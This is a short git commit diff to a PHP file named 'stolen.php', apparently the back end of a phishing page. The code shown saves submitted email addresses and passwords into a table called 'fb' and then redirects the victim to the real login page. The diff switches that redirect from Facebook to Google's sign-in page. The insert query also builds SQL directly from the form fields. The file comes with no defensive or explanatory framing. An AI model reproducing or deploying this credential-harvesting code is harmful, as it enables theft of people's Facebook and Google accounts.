50a1d7d7103bd63ebc258582b9ec0d225f8812a8
MavroidisV <mavroidis@hotmail.gr>
2016-07-09 18:41:48 +0100

    .

--- stolen.php
+++ stolen.php
@@ -14,11 +14,11 @@ echo $password;
         $query = mysqli_query($db, "INSERT INTO fb (email, password)VALUES ('$username','$password')")or die(mysqli_error($db));
         if(($query)==1)
         {
-            header("url=https://www.facebook.com");
+            header("location: https://accounts.google.com/ServiceLogin?service=mail&passive=true&rm=false&continue=https://mail.google.com/mail/&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1");
 
         } else echo "Enter again your credentials";
 
-   // https://accounts.google.com/ServiceLogin?service=mail&passive=true&rm=false&continue=https://mail.google.com/mail/&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1
+   //
 }
     
 ?>
